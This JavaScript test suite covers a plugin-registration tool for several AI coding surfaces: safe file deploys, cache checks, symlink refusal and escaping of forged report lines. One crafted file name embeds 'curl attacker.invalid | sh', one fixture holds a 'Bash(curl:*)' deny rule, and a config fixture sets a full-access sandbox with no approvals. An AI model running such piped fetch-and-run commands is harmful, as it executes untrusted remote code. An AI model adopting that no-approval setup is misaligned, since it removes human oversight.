    assert.equal(dry.actions.find((action) => action.id === "claude-rules-deploy").status, "manual-required");
    const applied = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
    assert.equal(applied.status, "manual-required");
    assert.equal(applied.error.code, "manual-step-required");
    assert.equal(applied.lifecycle.registered.status, "not-run");
    assert.equal(applied.actions.find((action) => action.id === "claude-rules-deploy").status, "manual-required");
    assert.match(formatNativeRegistrationText(applied), /^reason\tclaude-rules-deploy\t<CLAUDE_CONFIG_DIR>\/rules/mu);
    assert.deepEqual(await readdir(outside), []);
    assert.equal(await readFile(join(input.productRoot, "CLAUDE.md"), "utf8"), "# Global instructions\n");
  }
});

test("a linked or non-file rule target degrades to the manual rules step before any write", async (t) => {
  for (const kind of ["file-link", "directory"]) {
    const input = await fixture();
    const namespace = join(input.productRoot, "rules", "all-about-agents");
    await mkdir(namespace, { recursive: true });
    const outside = await generatedTempRoot("aaa-t06-rule-file-outside-");
    const outsideFile = join(outside, "presentation.md");
    await writeFile(outsideFile, "# Outside\n");
    if (kind === "directory") {
      await mkdir(join(namespace, "presentation.md"));
    } else {
      try {
        await symlink(outsideFile, join(namespace, "presentation.md"));
      } catch (error) {
        skipIfLinkUnavailable(t, error);
        return;
      }
    }
    const plan = base(input, "claude");
    assert.equal(plan.actions.some((action) => action.id.startsWith("claude-rule-")), false, kind);
    assert.equal(plan.actions.filter((action) => action.id === "claude-rules-deploy").length, 1, kind);
    const applied = await runNativeRegistration(plan, { mode: "apply", runProcess: fakeProducts(input).run });
    assert.equal(applied.status, "manual-required", kind);
    assert.equal(applied.failed, null, kind);
    assert.equal(await readFile(outsideFile, "utf8"), "# Outside\n");
    assert.deepEqual((await readdir(namespace)).sort(), ["presentation.md"], kind);
    assert.equal(await readFile(join(input.productRoot, "CLAUDE.md"), "utf8"), "# Global instructions\n");
  }
});

test("a malformed user permission list leaves settings.json untouched and needs a manual step", async () => {
  const input = await fixture();
  const body = `${JSON.stringify({ permissions: { deny: "Bash(curl:*)" }, theme: "dark" })}\n`;
  await writeFile(join(input.productRoot, "settings.json"), body);
  const report = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(await readFile(join(input.productRoot, "settings.json"), "utf8"), body);
  const settings = report.actions.find((action) => action.id === "claude-settings-deploy");
  assert.equal(settings.status, "manual-required");
  assert.match(settings.reason, /permissions\.deny/u);
  assert.equal(report.completed.some((action) => action.id === "claude-settings-deploy"), false);
  assert.equal(report.status, "manual-required");
  assert.equal(report.error.code, "manual-step-required");
  assert.equal(report.failed, null);
  assert.equal(report.actions.find((action) => action.id === "claude-plugin-install").status, "complete");
});

async function registerExitCode(input, surface) {
  return main(["register", "--surface", surface, "--profile", "template", "--package-root", input.packageRoot, "--apply", "--format", "json"], { write() {} }, { write() {} }, { productRoot: input.productRoot, runProcess: fakeProducts(input).run });
}

test("a no-clobber destination that contains the managed content is complete and untouched", async () => {
  const cases = [
    ["codex", "config.toml", "codex-config-deploy",
      'model = "gpt-5.6-sol"  \nsandbox_mode = "danger-full-access"\napproval_policy = "never"\n\n[features]\nmulti_agent = true\n\n[agents.verifier]\nconfig_file = "agents/verifier.toml"\ndescription = "Verifies."\n[marketplaces.all-about-agents]\nsource = "/somewhere"\n\n[agents.reviewer]\n  config_file = "agents/reviewer.toml"\ndescription = "Reviews."\n\n[plugins."all-about-agents@all-about-agents"]\nenabled = true\n'],
    ["antigravity", "GEMINI.md", "antigravity-instructions-deploy",
      `# My own section\r\n\r\nkeep me\r\n\r\n${GEMINI_BODY.replaceAll("\n", "  \r\n")}\r\n## Caveman mode\r\n\r\nalways on\r\n`]
  ];
  for (const [surface, file, id, body] of cases) {
    const input = await fixture();
    await writeFile(join(input.productRoot, file), body);
    const report = await runNativeRegistration(base(input, surface), { mode: "apply", runProcess: fakeProducts(input).run });
    assert.equal(report.status, "complete", surface);
    const deploy = report.actions.find((action) => action.id === id);
    assert.equal(deploy.status, "complete", surface);
    assert.equal(deploy.result.changed, false, surface);
    assert.equal(await readFile(join(input.productRoot, file), "utf8"), body, surface);
    assert.equal(await registerExitCode(input, surface), 0, surface);
  }
});

test("a no-clobber destination that misses managed content names it and stays untouched", async () => {
  const cases = [
    ["codex", "config.toml", "codex-config-deploy", CODEX_CONFIG.replace('[agents.verifier]\nconfig_file = "agents/verifier.toml"\ndescription = "Verifies."\n', "") + "[marketplaces.all-about-agents]\nsource = \"/somewhere\"\n", /\[agents\.verifier\]/u],
    ["codex", "config.toml", "codex-config-deploy", CODEX_CONFIG.replace('description = "Reviews."', 'description = "Edited."'), /\[agents\.reviewer\]/u],
    ["codex", "config.toml", "codex-config-deploy", CODEX_CONFIG.replace('model = "gpt-5.6-sol"\n', 'model = "other"\n'), /top-level keys/u],
    ["antigravity", "GEMINI.md", "antigravity-instructions-deploy", `# Mine\n\n${GEMINI_BODY.replace("Route each task to one skill.", "Route each task to two skills.")}`, /managed GEMINI\.md body/u]
  ];
  for (const [surface, file, id, body, named] of cases) {
    const input = await fixture();
    await writeFile(join(input.productRoot, file), body);
    const report = await runNativeRegistration(base(input, surface), { mode: "apply", runProcess: fakeProducts(input).run });
    assert.equal(report.status, "manual-required", `${surface} ${body}`);
    const deploy = report.actions.find((action) => action.id === id);
    assert.equal(deploy.status, "manual-required", surface);
    assert.match(deploy.reason, named, surface);
    assert.equal(await readFile(join(input.productRoot, file), "utf8"), body, surface);
    assert.equal(await registerExitCode(input, surface), 1, surface);
  }
});

test("a refused no-clobber file needs a manual step, exits 1, and stays untouched", async () => {
  for (const [surface, file, id] of [["codex", "config.toml", "codex-config-deploy"], ["antigravity", "GEMINI.md", "antigravity-instructions-deploy"]]) {
    const input = await fixture();
    const body = `# The operator's own ${file}\n`;
    await writeFile(join(input.productRoot, file), body);
    const report = await runNativeRegistration(base(input, surface), { mode: "apply", runProcess: fakeProducts(input).run });
    assert.equal(report.status, "manual-required", surface);
    assert.equal(report.error.code, "manual-step-required", surface);
    assert.equal(report.failed, null, surface);
    const refused = report.actions.find((action) => action.id === id);
    assert.equal(refused.status, "manual-required", surface);
    assert.match(refused.reason, new RegExp(`${file.replace(".", "\\.")} already exists and differs[\\s\\S]*merge [\\s\\S]*by hand`, "u"), surface);
    assert.match(report.error.message, new RegExp(file.replace(".", "\\."), "u"), surface);
    assert.equal(await readFile(join(input.productRoot, file), "utf8"), body, surface);

    let stdout = "";
    const code = await main(["register", "--surface", surface, "--profile", "template", "--package-root", input.packageRoot, "--apply", "--format", "json"], { write: (value) => { stdout += value; } }, { write() {} }, { productRoot: input.productRoot, runProcess: fakeProducts(input).run });
    assert.equal(code, 1, surface);
    assert.equal(JSON.parse(stdout).error.code, "manual-step-required", surface);
    assert.equal(await readFile(join(input.productRoot, file), "utf8"), body, surface);
  }
});

test("a file copy with matching bytes still restores the executable mode", async (t) => {
  if (process.platform === "win32") {
    t.skip("POSIX executable bits are not meaningful on Windows");
    return;
  }
  const input = await fixture();
  const renderer = join(input.productRoot, "statusline", "statusline.mjs");
  await mkdir(dirname(renderer), { recursive: true });
  await writeFile(renderer, "// renderer\n");
  await chmod(renderer, 0o644);
  const report = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(report.status, "complete");
  assert.equal((await stat(renderer)).mode & 0o777, 0o755);
  assert.equal(report.actions.find((action) => action.id === "claude-statusline-renderer-deploy").result.changed, true);
  const rerun = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(rerun.actions.find((action) => action.id === "claude-statusline-renderer-deploy").result.changed, false);
});

test("Claude registration owns only rules/all-about-agents and never touches the user's own rule files", async () => {
  assert.equal(CLAUDE_RULE_FILES.length, 10);
  const input = await fixture();
  const rulesRoot = join(input.productRoot, "rules");
  const namespace = join(rulesRoot, "all-about-agents");
  await mkdir(rulesRoot, { recursive: true });
  await writeFile(join(rulesRoot, "presentation.md"), "# The user's own presentation rule\n");
  const first = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(first.status, "complete");
  assert.deepEqual((await readdir(namespace)).sort(), CLAUDE_RULE_FILES);
  for (const name of CLAUDE_RULE_FILES) assert.equal(await readFile(join(namespace, name), "utf8"), `# ${name}\n`);
  assert.deepEqual((await readdir(rulesRoot)).sort(), ["all-about-agents", "presentation.md"]);
  assert.equal(await readFile(join(rulesRoot, "presentation.md"), "utf8"), "# The user's own presentation rule\n");

  const rerun = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(rerun.status, "complete");
  for (const action of rerun.actions.filter((entry) => entry.id.startsWith("claude-rule"))) {
    assert.equal(action.status, "complete", action.id);
    assert.equal(action.result.changed, false, action.id);
  }

  await writeFile(join(namespace, "evidence-and-truth.md"), "# An older package version of this rule\n");
  await writeFile(join(namespace, "removed-rule.md"), "# A rule the package no longer renders\n");
  const plan = base(input, "claude");
  const extra = plan.actions.find((action) => action.id === "claude-rules-extra-files");
  assert.equal(extra.kind, "manual");
  assert.match(extra.message, /rules\/all-about-agents\/removed-rule\.md/u);
  const updated = await runNativeRegistration(plan, { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(updated.status, "manual-required");
  assert.equal(updated.error.code, "manual-step-required");
  assert.match(updated.error.message, /removed-rule\.md/u);
  const replaced = updated.actions.find((action) => action.id === "claude-rule-evidence-and-truth-deploy");
  assert.equal(replaced.status, "complete");
  assert.equal(replaced.result.changed, true);
  assert.equal(await readFile(join(namespace, "evidence-and-truth.md"), "utf8"), "# evidence-and-truth.md\n");
  assert.equal(updated.actions.find((action) => action.id === "claude-rules-extra-files").status, "manual-required");
  assert.equal(await readFile(join(namespace, "removed-rule.md"), "utf8"), "# A rule the package no longer renders\n");
  assert.match(formatNativeRegistrationText(updated), /^reason\tclaude-rules-extra-files\t.*removed-rule\.md/mu);
  assert.equal(await readFile(join(rulesRoot, "presentation.md"), "utf8"), "# The user's own presentation rule\n");
});

test("Claude registration reports manual-required while the plugin cache still holds an older copy", async () => {
  const input = await fixture();
  const cacheRoot = claudeCacheRoot(input);
  await cp(input.packageRoot, cacheRoot, { recursive: true });
  await mkdir(join(cacheRoot, "skills", "removed-skill"), { recursive: true });
  await writeFile(join(cacheRoot, "skills", "removed-skill", "SKILL.md"), "# Removed from the package\n");

  const stale = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(stale.status, "manual-required");
  const check = stale.actions.find((action) => action.id === "claude-plugin-cache-check");
  assert.equal(check.status, "manual-required");
  assert.match(check.reason, /skills\/removed-skill\/SKILL\.md/u);
  assert.deepEqual(check.commands, CLAUDE_REINSTALL);
  assert.equal(stale.completed.some((action) => action.id === "claude-plugin-cache-check"), false);
  assert.equal(stale.error.code, "installed-copy-not-confirmed");
  assert.equal(stale.lifecycle.registered.status, "fail");
  assert.equal(stale.actions.at(-1).id, "claude-reload");
  assert.equal(JSON.stringify(stale).includes(input.productRoot), false);
  const text = formatNativeRegistrationText(stale);
  for (const command of CLAUDE_REINSTALL) assert.ok(text.includes(command), `text report omits ${command}`);

  await rm(cacheRoot, { recursive: true });
  const refreshed = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(refreshed.status, "complete");
  assert.equal(refreshed.actions.find((action) => action.id === "claude-plugin-cache-check").status, "complete");
});

test("Claude registration fails closed when the product output does not locate a comparable cache", async () => {
  const input = await fixture();
  const outside = await generatedTempRoot("aaa-t06-foreign-cache-");
  const cases = [
    [[], /no user-scope entry/u],
    [[{ id: PLUGIN_SELECTOR, scope: "project", enabled: true, installPath: claudeCacheRoot(input) }], /no user-scope entry/u],
    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true }], /has no installPath/u],
    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: outside }], /outside the plugin cache/u],
    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: input.productRoot }], /outside the plugin cache/u],
    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: join(input.productRoot, "plugins") }], /outside the plugin cache/u],
    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: join(input.productRoot, "plugins", "cache", "missing") }], /does not exist/u]
  ];
  for (const [listing, reason] of cases) {
    const report = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input, { listing }).run });
    assert.equal(report.status, "manual-required");
    const check = report.actions.find((action) => action.id === "claude-plugin-cache-check");
    assert.equal(check.status, "manual-required");
    assert.match(check.reason, reason);
    assert.deepEqual(check.commands, CLAUDE_REINSTALL);
  }
});

test("Claude cache check allows only known runtime files and flags every other difference", async () => {
  const input = await fixture();
  const cacheRoot = claudeCacheRoot(input);
  await cp(input.packageRoot, cacheRoot, { recursive: true });
  await writeFile(join(cacheRoot, "hooks", "audit", "activity-audit.log"), "cache-only runtime event\n", { flag: "a" });
  await mkdir(join(cacheRoot, "hooks", "checkpoints"), { recursive: true });
  await writeFile(join(cacheRoot, "hooks", "checkpoints", "checkpoint.jsonl"), "{}\n");
  await mkdir(join(cacheRoot, ".in_use"), { recursive: true });
  await writeFile(join(cacheRoot, ".in_use", "session-marker"), "");
  const register = async () => runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  const cacheCheck = (report) => report.actions.find((action) => action.id === "claude-plugin-cache-check");

  const clean = await register();
  assert.equal(clean.status, "complete");

  await writeFile(join(cacheRoot, "hooks", "activity-audit.mjs"), "// older hook\n");
  const changed = await register();
  assert.equal(changed.status, "manual-required");
  assert.match(cacheCheck(changed).reason, /hooks\/activity-audit\.mjs/u);
  await writeFile(join(cacheRoot, "hooks", "activity-audit.mjs"), "// hook\n");

  await rm(join(cacheRoot, ".claude-plugin", "marketplace.json"));
  const missing = await register();
  assert.equal(missing.status, "manual-required");
  assert.match(cacheCheck(missing).reason, /\.claude-plugin\/marketplace\.json/u);
  await writeFile(join(cacheRoot, ".claude-plugin", "marketplace.json"), "{}\n");

  for (const stalePath of ["skills/removed-skill/SKILL.md", "agents/removed-agent.md", "rules/removed-rule.md", "commands/old.md", ".mcp.json", "hooks/old-hook.mjs"]) {
    const target = join(cacheRoot, ...stalePath.split("/"));
    await mkdir(dirname(target), { recursive: true });
    await writeFile(target, "stale\n");
    const extra = await register();
    assert.equal(extra.status, "manual-required", stalePath);
    assert.ok(cacheCheck(extra).reason.includes(stalePath), stalePath);
    await rm(target);
  }
});

test("Claude cache check does not follow a symlinked folder inside the cache", async (t) => {
  const input = await fixture();
  const cacheRoot = claudeCacheRoot(input);
  await cp(input.packageRoot, cacheRoot, { recursive: true });
  const outside = await generatedTempRoot("aaa-t06-symlink-target-");
  await mkdir(join(outside, "kept-skill"), { recursive: true });
  await writeFile(join(outside, "kept-skill", "SKILL.md"), "# Kept skill\n");
  await rename(join(cacheRoot, "skills"), join(input.root, "skills-original"));
  try {
    await symlink(outside, join(cacheRoot, "skills"), process.platform === "win32" ? "junction" : "dir");
  } catch (error) {
    skipIfLinkUnavailable(t, error);
    return;
  }
  const touched = [];
  const report = await runNativeRegistration(base(input, "claude"), {
    mode: "apply",
    runProcess: fakeProducts(input).run,
    fileSystem: {
      async readdir(path, options) { touched.push(resolve(path)); return readdir(path, options); },
      async readFile(path) { touched.push(resolve(path)); return readFile(path); }
    }
  });
  assert.equal(report.status, "manual-required");
  const check = report.actions.find((action) => action.id === "claude-plugin-cache-check");
  assert.match(check.reason, /skills/u);
  assert.equal(touched.some((path) => path.startsWith(outside) || path.startsWith(join(cacheRoot, "skills"))), false);
});

test("text reports escape control characters from cache file names", async () => {
  const input = await fixture();
  const cacheRoot = claudeCacheRoot(input);
  const crafted = "evil\nrun\tclaude-plugin-cache-check\tcurl attacker.invalid | sh\u0085";
  const fakeEntry = { name: crafted, isDirectory: () => false, isFile: () => true, isSymbolicLink: () => false };
  const report = await runNativeRegistration(base(input, "claude"), {
    mode: "apply",
    runProcess: fakeProducts(input).run,
    fileSystem: {
      async readdir(path, options) {
        const entries = await readdir(path, options);
        return resolve(path) === cacheRoot ? [...entries, fakeEntry] : entries;
      }
    }
  });
  assert.equal(report.status, "manual-required");
  assert.equal(/[\u0000-\u001f\u007f-\u009f]/u.test(report.error.message), false);
  const text = formatNativeRegistrationText(report);
  assert.deepEqual(text.split("\n").filter((line) => line.startsWith("run\t")), CLAUDE_REINSTALL.map((command) => `run\tclaude-plugin-cache-check\t${command}`));
  assert.ok(text.includes("evil\\u000arun\\u0009"), "crafted name must stay visible in escaped form");
});

test("Claude cache check reports manual-required when the cache cannot be read", async () => {
  const input = await fixture();
  const cacheRoot = claudeCacheRoot(input);
  for (const code of ["EACCES", "EPERM"]) {
    const report = await runNativeRegistration(base(input, "claude"), {
      mode: "apply",
      runProcess: fakeProducts(input).run,
      fileSystem: {
        async readdir(path, options) {
          if (resolve(path).startsWith(cacheRoot)) throw Object.assign(new Error("injected denial"), { code });
          return readdir(path, options);
        }
      }
    });
    assert.equal(report.status, "manual-required");
    const check = report.actions.find((action) => action.id === "claude-plugin-cache-check");
    assert.match(check.reason, /cannot be read/u);
    assert.deepEqual(check.commands, CLAUDE_REINSTALL);
  }
});

test("Claude cache check reads the parent-level state of an all-surface package", async () => {
  const input = await fixture("template", { layout: "parent" });
  const complete = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(complete.status, "complete");
  assert.ok(complete.actions.find((action) => action.id === "claude-plugin-cache-check").result.comparedFiles > 0);
  const cacheRoot = claudeCacheRoot(input);
  await mkdir(join(cacheRoot, "skills", "removed-skill"), { recursive: true });
  await writeFile(join(cacheRoot, "skills", "removed-skill", "SKILL.md"), "# Removed\n");
  const stale = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(stale.status, "manual-required");
  assert.match(stale.actions.find((action) => action.id === "claude-plugin-cache-check").reason, /skills\/removed-skill\/SKILL\.md/u);
});

test("Codex registration reports manual-required while the package tree differs from its Git HEAD", async () => {
  const input = await fixture();
  const previous = { GIT_DIR: process.env.GIT_DIR, GIT_INDEX_FILE: process.env.GIT_INDEX_FILE };
  process.env.GIT_DIR = join(input.root, "elsewhere.git");
  process.env.GIT_INDEX_FILE = join(input.root, "elsewhere.index");
  try {
    const dirty = fakeProducts(input, { gitStatus: "?? skills/new-skill/SKILL.md\n" });
    const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: dirty.run });
    assert.equal(report.status, "manual-required");
    const gitCalls = dirty.calls.filter((request) => request.executable === "git");
    assert.deepEqual(gitCalls.map((request) => request.args), [
      ["-c", "core.fsmonitor=false", "rev-parse", "--show-prefix"],
      ["-c", "core.fsmonitor=false", "--no-optional-locks", "status", "--porcelain", "--untracked-files=all", "--", "."]
    ]);
    for (const request of gitCalls) {
      assert.equal(request.cwd, input.packageRoot);
      assert.equal(request.shell, false);
      assert.equal(request.envOverrides, undefined);
      assert.deepEqual(Object.keys(request.env).filter((key) => /^GIT_/iu.test(key)), []);
    }
    const check = report.actions.find((action) => action.id === "codex-plugin-source-check");
    assert.equal(check.status, "manual-required");
    assert.match(check.reason, /Git clone of the package root/u);
    assert.deepEqual(check.commands, [
      "git -C '<PACKAGE_ROOT>' status --short",
      "git -C '<PACKAGE_ROOT>' add -A",
      "git -C '<PACKAGE_ROOT>' -c user.name=all-about-agents -c user.email=all-about-agents@invalid.example commit -m \"Update local Codex plugin source\"",
      `codex plugin remove ${PLUGIN_SELECTOR} --json`,
      `codex plugin add ${PLUGIN_SELECTOR} --json`
    ]);
    assert.equal(JSON.stringify(report).includes("elsewhere"), false);
    assert.equal(report.actions.at(-1).id, "codex-hooks-trust");

    const clean = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input).run });
    assert.equal(clean.status, "complete");
  } finally {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
});

test("Codex registration requires the package root to be its own Git repository", async () => {
  const input = await fixture();
  for (const gitPrefix of ["codex/", null]) {
    const products = fakeProducts(input, { gitPrefix, gitStatus: "" });
    const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: products.run });
    assert.equal(report.status, "manual-required");
    const check = report.actions.find((action) => action.id === "codex-plugin-source-check");
    assert.match(check.reason, /the package root must be its own Git repository/u);
    assert.match(check.reason, /native-registration\.md/u);
    assert.deepEqual(check.commands, []);
    assert.equal(products.calls.some((request) => request.args.includes("status")), false);
  }

  const noGit = await runNativeRegistration(base(input, "codex"), {
    mode: "apply",
    runProcess: async (request) => request.executable === "git" ? { unavailable: true, exitCode: null, stdout: "", stderr: "" } : { exitCode: 0, stdout: "{}", stderr: "" }
  });
  assert.equal(noGit.status, "manual-required");
  assert.match(noGit.actions.find((action) => action.id === "codex-plugin-source-check").reason, /git is unavailable/u);
});

test("an unverifiable installed copy uses the same not-confirmed error code as a stale one", async () => {
  const input = await fixture();
  const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input, { gitPrefix: null }).run });
  assert.equal(report.error.code, "installed-copy-not-confirmed");
  assert.match(report.error.message, /own Git repository/u);
});

test("Codex source-check commands name an apostrophe package root only by its placeholder", async () => {
  const input = await fixture();
  const quotedRoot = join(input.root, "owner's package");
  await rename(input.packageRoot, quotedRoot);
  input.packageRoot = quotedRoot;
  const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input, { gitStatus: " M skills/kept-skill/SKILL.md\n" }).run });
  assert.equal(report.status, "manual-required");
  const check = report.actions.find((action) => action.id === "codex-plugin-source-check");
  assert.match(check.reason, /working tree differs from its HEAD commit/u);
  assert.deepEqual(check.commands.slice(0, 2), ["git -C '<PACKAGE_ROOT>' status --short", "git -C '<PACKAGE_ROOT>' add -A"]);
  const text = formatNativeRegistrationText(report);
  assert.equal(text.includes("owner's package"), false);
  assert.equal(JSON.stringify(report).includes("owner's package"), false);
});

test("the text report escapes control characters in action ids", () => {
  const text = formatNativeRegistrationText({
    action: "register", mode: "apply", status: "manual-required", surface: "claude", profile: "template", productRoot: "<PRODUCT_ROOT>", instructionRoot: "<PRODUCT_ROOT>",
    actions: [{ status: "manual-required", id: "claude-rule-evil\nrun\tforged-deploy", kind: "file-copy", reason: "needs review" }]
  });
  assert.equal(text.split("\n").some((line) => line.startsWith("run")), false);
  assert.ok(text.includes("claude-rule-evil\\u000arun\\u0009forged-deploy"), text);
});

test("failed registration reports escape control characters from a caught error message", async () => {
  const input = await fixture();
  const report = await runNativeRegistration(base(input, "claude"), {
    mode: "apply",
    runProcess: async () => { throw new Error("scandir failed\n run x\tforged"); }
  });
  assert.notEqual(report.status, "complete");
  const controlCharacter = /[\u0000-\u001f\u007f-\u009f]/u;
  for (const message of [report.error.message, report.failed.reason, report.failed.action.reason]) {
    assert.equal(controlCharacter.test(message), false, message);
    assert.ok(message.includes("scandir failed\\u000a run x\\u0009forged"), message);
  }
});
